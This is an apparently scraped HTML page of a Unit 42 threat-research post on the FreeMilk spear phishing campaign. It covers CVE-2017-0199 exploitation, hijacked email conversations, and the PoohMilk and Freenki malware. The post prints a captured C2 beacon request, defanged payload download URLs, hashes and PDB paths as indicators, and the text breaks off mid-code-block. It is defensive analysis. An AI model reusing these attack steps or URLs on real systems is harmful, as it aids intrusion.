@@ -1,0 +1,717 @@
+<!doctype html>
+<html lang="en-US" prefix="og: http://ogp.me/ns#">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>FreeMilk: A Highly Targeted Spear Phishing Campaign</title>
+
+<style id="reCAPTCHA-style" >.google-recaptcha-container{display:block;clear:both;}
+.google-recaptcha-container iframe{margin:0;}
+.google-recaptcha-container .plugin-credits a{text-decoration:underline;}</style>
+
+<!-- This site is optimized with the Yoast SEO plugin v9.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
+<meta name="description" content="Unit 42 uncovers FreeMilk: a highly targeted spear phishing campaign using hijacked conversations to deliver malware."/>
+<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-freemilk-highly-targeted-spear-phishing-campaign/" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="FreeMilk: A Highly Targeted Spear Phishing Campaign" />
+<meta property="og:description" content="Unit 42 uncovers FreeMilk: a highly targeted spear phishing campaign using hijacked conversations to deliver malware." />
+<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-freemilk-highly-targeted-spear-phishing-campaign/" />
+<meta property="og:site_name" content="Unit42" />
+<meta property="article:tag" content="FreeMilk" />
+<meta property="article:tag" content="Freenki" />
+<meta property="article:tag" content="N1stAgent" />
+<meta property="article:tag" content="PoohMilk" />
+<meta property="article:section" content="Unit 42" />
+<meta property="article:published_time" content="2017-10-05T12:00:02+00:00" />
+<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
+<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
+<meta property="og:image:width" content="650" />
+<meta property="og:image:height" content="300" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:description" content="Unit 42 uncovers FreeMilk: a highly targeted spear phishing campaign using hijacked conversations to deliver malware." />
+<meta name="twitter:title" content="FreeMilk: A Highly Targeted Spear Phishing Campaign" />
+<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
+<!-- / Yoast SEO plugin. -->
+
+<link rel='dns-prefetch' href='//www.google.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; FreeMilk: A Highly Targeted Spear Phishing Campaign Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-freemilk-highly-targeted-spear-phishing-campaign/feed/" />
+<meta property="og:date_created" content="October 5, 2017 at 5:00 AM"/>
+<meta property="og:category" content="Unit 42"/>
+<meta property="og:author" content="Juan Cortes"/>
+<meta property="og:author" content="Esmid Idrizovic"/>
+<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/juan-cortes/"/>
+<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/esmid-idrizovic/"/>
+<link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=4.9.9' type='text/css' media='all' />
+<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.2.13' type='text/css' media='all' />
+<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=4.9.9' type='text/css' media='all' />
+<link rel='stylesheet' id='griwpc-recaptcha-style-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/recaptcha-in-wp-comments-form/css/recaptcha.css?ver=9.1.0' type='text/css' media='all' />
+<style id='griwpc-recaptcha-style-inline-css' type='text/css'>
+.google-recaptcha-container{display:block;clear:both;}
+.google-recaptcha-container iframe{margin:0;}
+.google-recaptcha-container .plugin-credits a{text-decoration:underline;}
+</style>
+<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42/dist/styles/main.css' type='text/css' media='all' />
+<link rel='stylesheet' id='unit42/dev-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42/dist/styles/dev.css?sz=1554359596' type='text/css' media='all' />
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
+<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.9.9" />
+<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=44928' />
+<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-freemilk-highly-targeted-spear-phishing-campaign%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-freemilk-highly-targeted-spear-phishing-campaign%2F&#038;format=xml" />
+<style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
+				 -webkit-transition: opacity 0.3s ease;
+				 -moz-transition: opacity 0.3s ease;
+				 -o-transition: opacity 0.3s ease;
+				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
+				 -webkit-transition: opacity 0.3s ease;
+				 -moz-transition: opacity 0.3s ease;
+				 -o-transition: opacity 0.3s ease;
+				 transition: opacity 0.3s ease;}
+		#wpdevart_lb_information_content{
+			width:100%;	
+		}
+		#wpdevart_info_counter_of_imgs{
+			    display: inline-block;
+				padding-left:15px;
+				padding-right:4px;
+				font-size:20px;
+				color:#000000;
+		}
+		#wpdevart_info_caption{
+			    display: inline-block;
+				padding-left:15px;
+				padding-right:4px;
+				font-size:20px;
+				color:#000000;
+		}
+		#wpdevart_info_title{
+			    display: inline-block;
+				padding-left:5px;
+				padding-right:5px;
+				font-size:15px;
+				color:#000000;
+		}
+		@-webkit-keyframes rotate {
+			to   {-webkit-transform: rotate(360deg);}
+			from  {-webkit-transform: rotate(0deg);}
+		}
+		@keyframes rotate {
+			to   {transform: rotate(360deg);}
+			from  {transform: rotate(0deg);}
+		}
+		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
+			-webkit-animation: rotate 2s linear  infinite;
+    		animation: rotate 2s linear infinite;
+		}
+	  </style>      		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<!-- All in one Favicon 4.7 --><link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/unit42_400x400.jpg" type="image/png"/>
+<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/03/cropped-unit42_bug_square-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/03/cropped-unit42_bug_square-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/03/cropped-unit42_bug_square-180x180.png" />
+<meta name="msapplication-TileImage" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/03/cropped-unit42_bug_square-270x270.png" />
+  <script>var $ = jQuery;</script>
+  
+      <script src="//assets.adobedtm.com/90b129d72f4716e69353423cbd3d35a4caed23e2/satelliteLib-3ba4571080b832d788edeb2cf298df1434afed60.js"></script>
+  <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
+</head>
+  <body class="post-template-default single single-post postid-44928 single-format-standard">
+    <!--[if IE]>
+      <div class="alert alert-warning">
+        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
+    <![endif]-->
+    <header class="site-header bg-gray-700 py-sm-0 py-10">
+  <div class="container-lg">
+    <div class="row align-items-center">
+      <div class="col-3 d-sm-none">
+        <button class="btn-menu"><span></span></button>
+      </div>
+      <div class="col-sm-auto col order-sm-1 text-center">
+        <a href="https://unit42.paloaltonetworks.com/" class="logo d-inline-block">
+          <img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/unit42.svg" class="attachment-full size-full" alt="" />        </a>
+      </div>
+
+      <div class="col-sm-auto col-3 order-sm-3 text-right">
+        <a href="https://www.paloaltonetworks.com/" class="pan-logo d-inline-block" target="_blank">
+          <img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/paloaltonetworks.svg" class="attachment-full size-full" alt="" />        </a>
+      </div>
+
+      <div class="col-sm col-12 order-sm-2">
+        <nav class="site-nav mt-sm-0 mt-15 text-uppercase text-gray-500 font-weight-bold font-size-sm">
+          <ul id="menu-primary-navigation" class="main-menu d-sm-flex flex-sm-wrap justify-content-sm-center"><li id="menu-item-96224" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-96224"><a href="/">Latest Research</a></li>
+<li id="menu-item-81203" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81203"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
+<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a target="_blank" href="https://pan-unit42.github.io/playbook_viewer/">Playbooks</a></li>
+<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
+<li id="menu-item-92264" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-92264"><a href="https://unit42.paloaltonetworks.com/subscribe/">Subscribe</a></li>
+</ul>        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+  <article class="article pb-50">
+    <header class="news-header pt-35 pb-20 bg-gray-800">
+	<div class="container">
+		<div class="row justify-content-sm-center">
+			<div class="col-lg-9 col-md-11 col-12">
+				<ul class="news-breadcrumbs mb-20 d-flex flex-wrap justify-content-center font-size-ex-sm text-uppercase">
+	<li><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
+	<li><strong>FreeMilk: A Highly Targeted Spear Phishing Campaign</strong></li>
+</ul>
+				<h1 class="mb-20 font-weight-light text-white text-center">FreeMilk: A Highly Targeted Spear Phishing Campaign</h1>
+
+				<div class="entry-footer-menu mb-10 d-flex flex-wrap font-size-sm justify-content-center">
+										<div class="dropdown dropup loop-socials">
+						<button type="button" class="mr-30" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+							<span class="unit unit-5 mr-5 align-text-bottom"></span>
+						</button>             
+						<div class="dropdown-menu" role="toolbar">  
+							<div class="share-dropdown row align-items-center px-20 py-15">
+								<div class="col-auto"><p><strong>SHARE</strong></p></div>
+								<div class="col">
+									<div class="d-flex">
+									  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-freemilk-highly-targeted-spear-phishing-campaign%2F" target="_blank"><i class="d-iline-block align-middle unit unit-7"></i></a>
+									  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-freemilk-highly-targeted-spear-phishing-campaign%2F+-+FreeMilk%3A+A+Highly+Targeted+Spear+Phishing+Campaign" target="_blank"><i class="d-iline-block align-middle unit unit-10"></i></a>
+									  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-freemilk-highly-targeted-spear-phishing-campaign%2F&title=FreeMilk%3A+A+Highly+Targeted+Spear+Phishing+Campaign&summary=&source=" target="_blank"><i class="d-iline-block align-middle unit unit-12"></i></a>
+									  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-freemilk-highly-targeted-spear-phishing-campaign/" target="_blank"><i class="d-iline-block align-middle unit unit-13"></i></a>
+									</div>
+								</div>
+							</div>
+						</div>  
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</header>        <div class="container mt-40">
+      <div class="row justify-content-sm-center">
+        <div class="col-sm-9 col-12">
+          <div class="px-lg-35">
+            
+<div class="meta-summary mb-sm-40 mb-30 py-sm-35 py-15 px-sm-40 px-15 font-size-sm rounded">
+  <div class="row align-items-center">
+    <div class="col-auto d-sm-block d-none">
+              <figure class="mr-sm-20">
+          <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42/dist/images/svg/unit-news-meta.svg" alt="Unit42 Logo">
+        </figure>
+          </div>
+
+    <div class="col">
+      <p class="h4 font-weight-normal">
+        By <a href="https://unit42.paloaltonetworks.com/author/juan-cortes/" title="Posts by Juan Cortes" class="author url fn" rel="author">Juan Cortes</a> and <a href="https://unit42.paloaltonetworks.com/author/esmid-idrizovic/" title="Posts by Esmid Idrizovic" class="author url fn" rel="author">Esmid Idrizovic</a>      </p>
+      <p><time datetime="2017-10-05T12:00:02+00:00">October 5, 2017 at 5:00 AM</time></p>
+      <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
+      <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/freemilk/" rel="tag">FreeMilk</a>, <a href="https://unit42.paloaltonetworks.com/tag/freenki/" rel="tag">Freenki</a>, <a href="https://unit42.paloaltonetworks.com/tag/n1stagent/" rel="tag">N1stAgent</a>, <a href="https://unit42.paloaltonetworks.com/tag/poohmilk/" rel="tag">PoohMilk</a></p>
+    </div>
+  </div>
+</div>                        <div class="entry-content">
+              <p>In May 2017, Palo Alto Networks Unit 42 identified a limited spear phishing campaign targeting various individuals across the world. The threat actor leveraged the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199">CVE-2017-0199 Microsoft Word Office/WordPad Remote Code Execution Vulnerability</a> with carefully crafted decoy content customized for each target recipient. Our research showed that the spear phishing emails came from multiple compromised email accounts tied to a legitimate domain in North East Asia. We believe that the threat actor hijacked an existing, legitimate in-progress conversation and posed as the legitimate senders to send malicious spear phishing emails to the recipients as shown below in Figure 1.
+<p><img class="alignnone size-full wp-image-44931" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_1.png" alt="FreeMilk_1" width="571" height="879" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_1.png 571w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_1-195x300.png 195w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_1-500x770.png 500w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_1-26x40.png 26w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_1-370x570.png 370w" sizes="(max-width: 571px) 100vw, 571px" />
+<p><em>Figure 1 Conversation Hijacking to Deliver Malware</em>
+<p>Upon successful exploitation, the malicious document delivered two malware payloads PoohMilk and Freenki.
+<p>The targeted victims in this campaign we identified include:
+<ul>
+<li>a bank based in the Middle East</li>
+<li>trademark and intellectual property service companies based in Europe</li>
+<li>an international sporting organisation</li>
+<li>individuals with indirect ties to a country in North East Asia</li>
+</ul>
+<p>In past activity that we believe is linked to this same threat actor, dissidents and others were also likely targeted. We named this campaign âFreeMilkâ after the words found in the malwaresâ PDB path string.
+<h2><strong>Malicious Document</strong></h2>
+<p>The threat actor leveraged Microsoft Word CVE-2017-0199 vulnerability which is popularly used in both targeted and non-targeted attacks at present. The malicious document sends out the following beacon to a compromised website server as shown in Figure 2.<!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5ca5a52cd7af2509851348" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+GET /btob_asiana/udel_calcel.php?fdid=Skg/W1MkR2ZVOT5mVDg3JkpIO2RLRjNrSkgmIUpJO11TOGlhPV4/Z1NCLi4= HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+Host: old.jrchina[.]com
+Connection: Keep-Alive</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5ca5a52cd7af2509851348-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7af2509851348-2">2</div><div class="crayon-num" data-line="crayon-5ca5a52cd7af2509851348-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7af2509851348-4">4</div><div class="crayon-num" data-line="crayon-5ca5a52cd7af2509851348-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7af2509851348-6">6</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5ca5a52cd7af2509851348-1"><span class="crayon-v">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">btob_asiana</span><span class="crayon-o">/</span><span class="crayon-v">udel_calcel</span><span class="crayon-sy">.</span><span class="crayon-v">php</span><span class="crayon-sy">?</span><span class="crayon-v">fdid</span><span class="crayon-o">=</span><span class="crayon-v">Skg</span><span class="crayon-o">/</span><span class="crayon-v">W1MkR2ZVOT5mVDg3JkpIO2RLRjNrSkgmIUpJO11TOGlhPV4</span><span class="crayon-o">/</span><span class="crayon-v">Z1NCLi4</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7af2509851348-2"><span class="crayon-v">Accept</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div><div class="crayon-line" id="crayon-5ca5a52cd7af2509851348-3"><span class="crayon-v">Accept</span><span class="crayon-o">-</span><span class="crayon-v">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7af2509851348-4"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">4.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">MSIE</span><span class="crayon-h"> </span><span class="crayon-cn">6.0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">SV1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-e">NET </span><span class="crayon-i">CLR</span><span class="crayon-h"> </span><span class="crayon-cn">2.0.50727</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-e">NET </span><span class="crayon-i">CLR</span><span class="crayon-h"> </span><span class="crayon-cn">3.0.4506.2152</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-e">NET </span><span class="crayon-i">CLR</span><span class="crayon-h"> </span><span class="crayon-cn">3.5.30729</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-v">NET4</span><span class="crayon-sy">.</span><span class="crayon-cn">0C</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-v">NET4</span><span class="crayon-sy">.</span><span class="crayon-cn">0E</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5ca5a52cd7af2509851348-5"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">old</span><span class="crayon-sy">.</span><span class="crayon-v">jrchina</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7af2509851348-6"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Keep</span><span class="crayon-o">-</span><span class="crayon-v">Alive</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0007 seconds] -->
+<p><em>Figure 2. Malicious Word document callback beacon</em>
+<p>The C2 server responds with a Base64 encoded PowerShell script which in turn downloads two fake image files that contain embedded PE binaries and a JavaScript file which extracts the embedded PE binaries onto the victim host as shown in Figure 3. The extracted PE payloads are what we label as PoohMilk and Freenki.
+<table>
+<tbody>
+<tr>
+<td width="111">Original File SHA256
+<p>(Original File Name)</td>
+<td width="111">Download URL</td>
+<td width="111">Extracted Payload SHA256
+<p>(Saved File Name)</td>
+<td width="111">Description</td>
+</tr>
+<tr>
+<td width="111">1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3c
+<p>(udel_ok.ipp)</td>
+<td width="111">http://old.jrchina[.]com/btob_asiana/udel_ok.ipp</td>
+<td width="111">&#8211;</td>
+<td width="111">JavaScript to extract and run the payload</td>
+</tr>
+<tr>
+<td width="111">64ef80e7639c8c5dddf239883617e6740c6b3589f995d11314d36ab64fcfc54c
+<p>(appach01.jpg)</td>
+<td width="111">http://old.jrchina[.]com/btob_asiana/appach01.jpg</td>
+<td width="111">7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54df
+<p>(Windows-KB275122-x86.exe)</td>
+<td width="111">Fake image extracts to Freenki downloader</td>
+</tr>
+<tr>
+<td width="111">40572e1fc37f4376fdb2a33a6c376631ff7bc00b1e64538a0385bc1e09a85574
+<p>(appach02.jpg)</td>
+<td width="111">http://old.jrchina[.]com/btob_asiana/appach02.jpg</td>
+<td width="111">35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2
+<p>(Windows-KB271854-x86.exe)</td>
+<td width="111">PoohMilk loader</td>
+</tr>
+</tbody>
+</table>
+<p><em>Figure 3. Downloaded files and extracted payloads</em>
+<h2><strong>PoohMilk Loader Analysis</strong></h2>
+<p>Our analysis shows that PoohMilk is the first stage loader. After a successful exploitation, it sets persistence in the registry with the appropriate command line argument to execute the second stage payload, in this case, Freenki. The following registry key-value pair in Figure 4 is used.
+<p><img class="alignnone size-full wp-image-44955" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2.png" alt="FreeMilk_2" width="950" height="193" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2.png 950w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-510x104.png 510w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-500x102.png 500w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-197x40.png 197w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-650x132.png 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-300x61.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-768x156.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-874x178.png 874w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_2-370x75.png 370w" sizes="(max-width: 950px) 100vw, 950px" />
+<p><em>Figure 4. Registry key value set for the second stage payload by PoohMilk</em>
+<p>In addition to setting up the next stage, PoohMilk attempts to read and parse a file named &#8220;wsatra.tmp&#8221; in the userâs temp folder. If found, it reads its contents hoping to identify a path which is then searched in order to identify any file with an LNK extension, the same path is then searched for files with a ZIP extension. The exact reason why it looks for *.lnk files is unclear. However, if it finds a *.zip file, it extracts its contents and copies the data to a file under the user&#8217;s temp folder. Using the following filename format:
+<p>&#8220;%s\\Rar0tmpExtra%d.rtf&#8221;
+<p>Where the &#8216;%d&#8217; is taken from the return value of a call to the Windows API GetTickCount(). It then continues to execute this file with the Windows API ShellExecuteW().
+<p>The following PDB paths in Figure 5 were found from PoohMilk loader samples.<!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5ca5a52cd7af9965991261" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+E:\BIG_POOH\Project\milk\Release\milk.pdb
+E:\BIG_POOH\Project\Desktop\milk\Release\milk.pdb</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5ca5a52cd7af9965991261-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7af9965991261-2">2</div></div>
+				</td>
